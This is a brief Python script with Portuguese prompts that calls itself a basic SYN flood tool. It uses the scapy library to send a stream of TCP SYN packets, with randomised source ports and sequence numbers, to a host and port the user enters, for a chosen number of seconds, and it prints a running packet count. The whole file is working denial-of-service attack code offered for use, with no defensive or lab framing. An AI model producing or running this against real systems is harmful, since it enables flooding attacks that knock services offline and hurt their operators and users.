#!/usr/bin/env python3
"""SYN flood bem básico."""

import random
import sys
import time

try:
	from scapy.all import IP, TCP, send
except ImportError:
	print("Instale a biblioteca scapy com: pip install scapy")
	sys.exit(1)

print("Mini ferramenta de SYN flood")
alvo = input("IP/host alvo: ").strip()
if not alvo:
	print("Nada informado. Saindo.")
	sys.exit(1)

porta_texto = input("Porta do serviço (Enter usa 80): ").strip()
porta_destino = 80 if not porta_texto else int(porta_texto)

tempo_texto = input("Tempo em segundos (Enter usa 10): ").strip()
tempo_total = 10 if not tempo_texto else float(tempo_texto)

inicio = time.time()
enviados = 0

try:
	while time.time() - inicio < tempo_total:
		porta_origem = random.randint(1024, 65535)
		seq = random.randint(0, 4294967295)
		pacote = IP(dst=alvo) / TCP(sport=porta_origem, dport=porta_destino, flags="S", seq=seq)
		send(pacote, verbose=False)
		enviados += 1
		if enviados % 50 == 0:
			print(f"Enviados: {enviados}")
except KeyboardInterrupt:
	print("Interrompido pelo usuário.")

print(f"Total de SYN enviados: {enviados}")
